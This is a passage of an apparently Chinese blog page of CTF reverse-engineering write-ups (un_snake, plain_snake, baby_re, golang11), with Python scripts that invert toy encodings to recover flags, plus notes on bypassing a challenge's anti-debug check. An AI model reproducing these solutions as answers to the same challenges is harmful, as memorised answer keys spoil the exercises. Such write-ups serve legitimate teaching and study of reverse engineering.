<h4 id="解题-12"><a href="#解题-12" class="headerlink" title="解题"></a>解题</h4><p>首先运行exe，会在C盘生成个SYC_DLL.dll<br>复制到工作目录下，修复该dll，改DOS头MZ<br>然后在vs新建x86控制台工程，隐式调用该dll<br>函数指针类型提示中有（运行exe得到）<br>然后就会弹窗显示flag</p>
<p>也可以直接ida分析dll文件</p>
<h3 id="un-snake"><a href="#un-snake" class="headerlink" title="un_snake"></a>un_snake</h3><p>题目给了一个pyc文件，使用uncompyle6反编译</p>
<p>根据反编译结果写反函数即可</p>
<h4 id="正向流程"><a href="#正向流程" class="headerlink" title="正向流程"></a>正向流程</h4><ul>
<li>flag = encode(flag)</li>
<li>flag = pre(flag)</li>
<li>flag = enc(flag)</li>
<li>flag = b64encode(flag)</li>
<li>cmp flag, target</li>
</ul>
<h4 id="反向分析"><a href="#反向分析" class="headerlink" title="反向分析"></a>反向分析</h4><h4 id="pre"><a href="#pre" class="headerlink" title="pre()"></a>pre()</h4><p>做了个异或运算，所以它的反函数还算它本身</p>
<h4 id="enc"><a href="#enc" class="headerlink" title="enc()"></a>enc()</h4><p>先逐个异或，然后交换高低位，反函数也很好写</p>
<h4 id="解题脚本-1"><a href="#解题脚本-1" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unenc</span>(<span class="params">plain</span>):</span></span><br><span class="line">    plain = <span class="built_in">list</span>(plain)</span><br><span class="line"></span><br><span class="line">    length = <span class="built_in">len</span>(plain) - <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain) - <span class="number">1</span>):</span><br><span class="line">        plain[length - i] ^= plain[length - i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        c = plain[i]</span><br><span class="line">        plain[i] = (c &gt;&gt; <span class="number">3</span> | c &lt;&lt; <span class="number">5</span>) &amp; <span class="number">255</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plain[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpre</span>(<span class="params">data</span>):</span></span><br><span class="line">    th1s = <span class="string">&#x27;TBESCFSRSAEUITANAIIN&#x27;</span>.encode()</span><br><span class="line">    <span class="keyword">if</span> (data_len := <span class="built_in">len</span>(data)) &gt; (th1s_len := <span class="built_in">len</span>(th1s)):</span><br><span class="line">        th1s = th1s * (data_len // th1s_len) + th1s[:data_len - th1s_len]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y, data, th1s))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;mEiQCAjJoXJy2NiZQGGQyRm6IgHYQZAICKgowHHo4Dg=&#x27;</span></span><br><span class="line">flag = b64decode(flag)</span><br><span class="line">print(flag)</span><br><span class="line">flag = unenc(flag)</span><br><span class="line">print(flag)</span><br><span class="line">flag = unpre(flag)</span><br><span class="line">print(flag)</span><br><span class="line">flag = flag.decode()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h3 id="plain-snake"><a href="#plain-snake" class="headerlink" title="plain_snake"></a>plain_snake</h3><h4 id="提示-10"><a href="#提示-10" class="headerlink" title="提示"></a>提示</h4><p>字节码，<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/dis.html">https://docs.python.org/zh-cn/3/library/dis.html</a></p>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给出字节码的反汇编，根据反汇编还原python脚本</p>
<h4 id="例子（源自本题）"><a href="#例子（源自本题）" class="headerlink" title="例子（源自本题）"></a>例子（源自本题）</h4><p>代码<code>s = s[4:-1]</code>的字节码反汇编如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LOAD_FAST (s)</span><br><span class="line">LOAD_CONST (4)</span><br><span class="line">LOAD_CONST (-1)</span><br><span class="line">BUILD_SLICE 2</span><br><span class="line">BINARY_SUBSCR</span><br><span class="line">STORE_FAST (s)</span><br></pre></td></tr></table></figure>

<p>这里其实我有个疑问，按文档应该是BUILD_SLICE 3？</p>
<h4 id="还原代码"><a href="#还原代码" class="headerlink" title="还原代码"></a>还原代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn0</span>(<span class="params">s</span>):</span> <span class="comment"># 3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn1</span>(<span class="params">s</span>):</span> <span class="comment"># 6</span></span><br><span class="line">    s = s.encode()</span><br><span class="line">    s = <span class="built_in">list</span>(s)</span><br><span class="line">    s = [x^<span class="number">83</span> <span class="keyword">for</span> x <span class="keyword">in</span> s]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">        s[i], s[i+<span class="number">1</span>] = s[i+<span class="number">1</span>], s[i]</span><br><span class="line">        s[i]^=<span class="number">89</span></span><br><span class="line">        s[i+<span class="number">1</span>]^=<span class="number">67</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(s).decode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">s</span>):</span> <span class="comment"># 16</span></span><br><span class="line">    s = s.encode()</span><br><span class="line">    <span class="keyword">if</span>(b64encode(s) == <span class="string">b&#x27;c0BiZGQgSU9kJEhPVXU5RH5ofk9lIA==&#x27;</span>): <span class="comment"># f -&gt; 21</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInput</span>():</span> <span class="comment"># 23</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>): <span class="comment"># guess</span></span><br><span class="line">        s = <span class="built_in">input</span>(<span class="string">&#x27;Type in the flag:&#x27;</span>) <span class="comment"># f -&gt; 28</span></span><br><span class="line">        <span class="keyword">if</span>(s.startswith(<span class="string">&#x27;SYC&#123;&#x27;</span>) <span class="keyword">and</span> s.endswith(<span class="string">&#x27;&#125;&#x27;</span>)):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">&#x27;Wrong format, try again!&#x27;</span>) <span class="comment"># jmp 25</span></span><br><span class="line">    s = s[<span class="number">4</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: <span class="comment"># 32</span></span><br><span class="line">    print(<span class="string">&#x27;Welcome to python!&#x27;</span>)</span><br><span class="line">    s = getInput()</span><br><span class="line">    fn0(s)</span><br><span class="line">    s = fn1(s)</span><br><span class="line">    <span class="keyword">if</span>(check(s)): <span class="comment"># False -&gt; 40</span></span><br><span class="line">        print(<span class="string">&#x27;Correct!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;Wrong!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="解题脚本-2"><a href="#解题脚本-2" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">target = <span class="string">b&#x27;c0BiZGQgSU9kJEhPVXU5RH5ofk9lIA==&#x27;</span></span><br><span class="line">s = b64decode(target)</span><br><span class="line">s = <span class="built_in">list</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">    s[i]^=<span class="number">89</span></span><br><span class="line">    s[i+<span class="number">1</span>]^=<span class="number">67</span></span><br><span class="line">    s[i], s[i+<span class="number">1</span>] = s[i+<span class="number">1</span>], s[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    s[i] ^= <span class="number">83</span></span><br><span class="line"></span><br><span class="line">s = <span class="built_in">bytes</span>(s).decode()</span><br><span class="line">print(<span class="string">&#x27;SYC&#123;&#x27;</span> + s + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="baby-re"><a href="#baby-re" class="headerlink" title="baby_re"></a>baby_re</h3><p>通过搜索字符串找到主函数位置：0x432DA0</p>
<h4 id="目标内容"><a href="#目标内容" class="headerlink" title="目标内容"></a>目标内容</h4><p>里面给了一个char数组，数组包含负数，用脚本转换成16进制补码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v13 = [<span class="number">0x4e</span>, <span class="number">21</span>, -<span class="number">60</span>, -<span class="number">19</span>, -<span class="number">90</span>, <span class="number">47</span>, <span class="number">86</span>, <span class="number">16</span>, -<span class="number">69</span>, <span class="number">19</span>, -<span class="number">21</span>, -<span class="number">83</span>, <span class="number">117</span>, <span class="number">86</span>, -<span class="number">57</span>, -<span class="number">69</span>, -<span class="number">69</span>, -<span class="number">23</span>, -<span class="number">71</span>, -<span class="number">52</span>, <span class="number">2</span>, <span class="number">58</span>, <span class="number">80</span>, -<span class="number">97</span>, <span class="number">54</span>, -<span class="number">112</span>, <span class="number">105</span>, -<span class="number">66</span>, <span class="number">124</span>, <span class="number">66</span>, <span class="number">68</span>, -<span class="number">54</span>, -<span class="number">58</span>, -<span class="number">44</span>, <span class="number">36</span>, <span class="number">92</span>, -<span class="number">46</span>, -<span class="number">71</span>, <span class="number">36</span>, -<span class="number">63</span>, <span class="number">24</span>, -<span class="number">109</span>, -<span class="number">77</span>, -<span class="number">22</span>]</span><br><span class="line">n_v13 = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v13:</span><br><span class="line">    <span class="keyword">if</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">        n_v13.append(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># ((-i) - 1) ^ 0xFF</span></span><br><span class="line">        n_v13.append((-i-<span class="number">1</span>)^<span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line">print(n_v13)</span><br></pre></td></tr></table></figure>

<h4 id="正向流程-1"><a href="#正向流程-1" class="headerlink" title="正向流程"></a>正向流程</h4><h4 id="step1：sub-42F057"><a href="#step1：sub-42F057" class="headerlink" title="step1：sub_42F057()"></a>step1：sub_42F057()</h4><p>该函数有反调试的作用，根据你使用的调试器，获取一个字符串，用于下一步，绕过方法在step-2中（正确结果是‘x0nB@D’）</p>
<h4 id="step2：sub-432B20"><a href="#step2：sub-432B20" class="headerlink" title="step2：sub_432B20()"></a>step2：sub_432B20()</h4><p>根据上一步生成的字符串，以及输入flag的长度，生成长256的字符串</p>
<h4 id="step3：sub-4329B0"><a href="#step3：sub-4329B0" class="headerlink" title="step3：sub_4329B0()"></a>step3：sub_4329B0()</h4><p>根据上一步生成的长256的字符串，对输入进行处理</p>
<p>对于每一个输入，交换长256字符串的内容，再根据这个字符串计算出一个下标，取字符串中该下标的内容，与输入进行异或处理</p>
<h4 id="解题-13"><a href="#解题-13" class="headerlink" title="解题"></a>解题</h4><h4 id="step-3：改写sub-4329B0"><a href="#step-3：改写sub-4329B0" class="headerlink" title="step-3：改写sub_4329B0()"></a>step-3：改写sub_4329B0()</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_4329B0</span>(<span class="params">a1, a2, a3, a4</span>):</span></span><br><span class="line"><span class="comment">### a2 = len256string</span></span><br><span class="line"><span class="comment">### a3 = target</span></span><br><span class="line"><span class="comment">### a4 = length = 44</span></span><br><span class="line">    v8 = <span class="number">0</span></span><br><span class="line">    v14 = <span class="number">0</span></span><br><span class="line">    v2c = <span class="number">0</span></span><br><span class="line">    v38 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    v = []</span><br><span class="line">    <span class="keyword">for</span> v38 <span class="keyword">in</span> <span class="built_in">range</span>(a4):</span><br><span class="line">        v8 = ui(v8 + <span class="number">1</span>)</span><br><span class="line">        v14 = ui(v14 + a2[v8])</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        v20 = a2[v8]</span></span><br><span class="line"><span class="string">        a2[v8] = a2[v14]</span></span><br><span class="line"><span class="string">        a2[v14] = v20</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        a2[v8], a2[v14] = a2[v14], a2[v8]</span><br><span class="line">        v2c = ui(a2[v8] + a2[v14])</span><br><span class="line">        v.append( a2[v2c] )</span><br><span class="line">        a3[v38] = ui(a3[v38]^a2[v2c])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v</span><br></pre></td></tr></table></figure>

<p>代码中使用v保存了每次异或运算第二个数，如此一来，反函数只需要把flag与v异或即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_4329B0</span>(<span class="params">a3, a4, v</span>):</span></span><br><span class="line"><span class="comment">### a3 = inputs</span></span><br><span class="line"><span class="comment">### a4 = length = 44</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a4):</span><br><span class="line">        a3[i] = a3[i] ^ v[i]</span><br></pre></td></tr></table></figure>

<h4 id="step-2：获取sub-432B20-结果"><a href="#step-2：获取sub-432B20-结果" class="headerlink" title="step-2：获取sub_432B20()结果"></a>step-2：获取sub_432B20()结果</h4><p>先运行程序，然后打开x32dbg，附加到该程序，找到这个函数，直接复制粘贴运行后的结果</p>
<h4 id="解题脚本-3"><a href="#解题脚本-3" class="headerlink" title="解题脚本"></a>解题脚本</h4><p>至此，准备工作完毕，可以写出解题脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;a&#x27;</span>*<span class="number">44</span>  <span class="comment"># 随便取长44的内容</span></span><br><span class="line">target = [...] <span class="comment"># 目标数组，开头给出计算脚本</span></span><br><span class="line">v19 = [...]    <span class="comment"># step-2中获取</span></span><br><span class="line">v = sub_4329B0(<span class="number">1</span>, v19, flag, <span class="number">44</span>) <span class="comment"># 获取v</span></span><br><span class="line">re_4329B0(target, <span class="number">44</span>, v) <span class="comment"># 算出flag</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> target:</span><br><span class="line">    print(<span class="built_in">chr</span>(c), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure>

<p>得到的flag是ùYC{Pjx_s_Wom3n_cl0thing_1s_S0oo0o0_cute!1i}</p>
<p>把第一个改成S即可（不知道为什么第一个字符错了）</p>
<h3 id="golang11"><a href="#golang11" class="headerlink" title="golang11"></a>golang11</h3><h4 id="简介-12"><a href="#简介-12" class="headerlink" title="简介"></a>简介</h4><p>简单的go语言逆向</p>
<h4 id="go语言逆向"><a href="#go语言逆向" class="headerlink" title="go语言逆向"></a>go语言逆向</h4><p>使用Idagolanghelper插件，ida7.0需要修改部分脚本才能使用</p>
<h4 id="主函数猜的结果"><a href="#主函数猜的结果" class="headerlink" title="主函数猜的结果"></a>主函数猜的结果</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">q = [<span class="number">0x53</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x78</span>, <span class="number">0x70</span>, <span class="number">0x6D</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0x62</span>, <span class="number">0x35</span>, <span class="number">0x60</span>,</span><br><span class="line"><span class="number">0x7A</span>, <span class="number">0x5B</span>, <span class="number">0x62</span>, <span class="number">0x36</span>, <span class="number">0x6B</span>, <span class="number">0x61</span>, <span class="number">0x6F</span>, <span class="number">0x65</span>, <span class="number">0x5C</span>, <span class="number">0x76</span>, <span class="number">0x60</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x7A</span>]</span><br><span class="line"></span><br><span class="line">v20 = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">v12 = [...] <span class="comment"># 输入的flag，长24</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    <span class="comment"># 1</span></span><br><span class="line">    a1 = i - <span class="number">8</span> * (i &gt;&gt; <span class="number">3</span>)</span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    a2 = v20[a1] ^ v12[i]</span><br><span class="line">    <span class="comment"># 3</span></span><br><span class="line">    <span class="keyword">if</span>(q[j] != a2):</span><br><span class="line">    print(<span class="string">&#x27;???&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="反函数"><a href="#反函数" class="headerlink" title="反函数"></a>反函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    i = <span class="number">23</span> - i_i</span><br><span class="line">    <span class="comment"># -3</span></span><br><span class="line">    a2 = q[i]</span><br><span class="line">    <span class="comment"># 1</span></span><br><span class="line">    a1 = i - <span class="number">8</span> * (i &gt;&gt; <span class="number">3</span>)</span><br><span class="line">    <span class="comment"># -2</span></span><br><span class="line">    v12[i] = a2 ^ v20[a1]</span><br></pre></td></tr></table></figure>


    </div>

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
    <div id="comment">
        <div id="gitalk-container">
        </div>
    </div>
    
</div>
                     
<footer id="footer">
    <div class="footer-wrap">
        <div>
            © 2016 - 2021 windgodm
            <span class="footer-icon">
                <a-icon type="flag" theme="filled" /></span>
            @yssf
        </div>
        <div></div>
        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
        
    </div>

</footer>

<script src="/blog/js/highlight.min.js"></script>
<script src="/blog/js/particle.js"></script>
                </div>
            </div>
        </transition>
    </div>

    <script>
    new Vue({
        el: "#layout",
        data: {
            show_page: false,
            onload_menu: false,
            menu_show: false,
            card_top: 100
        },
        created: function () {
            var that = this
            window.onload = function () {
                that.show_page = true
                document.getElementById("loadcontent").style.opacity = 0
                setTimeout(function () {
                    document.getElementById("loadleft").style.width = 0
                    document.getElementById("loadright").style.width = 0
                }, 300)
                setTimeout(function () {
                    document.getElementById("loading").style = "display:none"
                }, 600)
            }
        },
        mounted: function () {
            var that = this
            window.addEventListener('scroll', function (e) {
                that.menu_show = false
            })
        },
        methods: {
            home_click: function () {
                window.scrollTo({
                    top: window.innerHeight - 80,
                    behavior: "smooth",
                });
            }
        }
    })
</script>

</body>

</html>